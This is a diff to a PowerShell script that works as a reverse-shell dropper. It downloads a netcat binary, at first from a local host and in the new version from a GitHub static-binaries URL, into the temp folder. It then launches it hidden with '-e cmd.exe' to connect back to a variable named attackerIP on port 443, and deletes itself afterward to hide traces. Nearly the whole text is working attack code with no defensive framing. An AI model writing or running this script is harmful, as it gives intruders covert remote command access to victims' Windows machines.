@@ -1,19 +1,23 @@
-# Define variable
-$ncUrl = "http://192.168.1.104:80/nc.exe"
-$ncPath = "C:\Windows\Temp\nc.exe"
-$ncCommand = "C:\Windows\Temp\nc.exe 192.168.1.104 443"
+[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
 
-# Download nc.exe
-Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath
+# Stable nc.exe (x86)
+$ncUrl      = "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nc.exe"
+$ncPath     = "$env:TEMP\nc.exe"
+$attackerIP = "192.168.1.104"
+$port       = "443"
 
-# Create a PowerShell script to run nc.exe and delete itself
-$ScriptPath = "C:\Windows\Temp\RunAndDelete.ps1"
-$ScriptContent = @"
-Start-Process -FilePath "$ncCommand" -ArgumentList '' -WindowStyle Hidden
-Remove-Item -Path '$ScriptPath' -Force
-"@
-Set-Content -Path $ScriptPath -Value $ScriptContent
+# Downloads
+try {
+    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30
+} catch {
+    exit 1
+}
 
-# Run the script
+# Run
+if (Test-Path $ncPath) {
+    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden
+}
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $ScriptPath" -WindowStyle Hidden
+# Delete
+Start-Sleep -Seconds 2
+Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
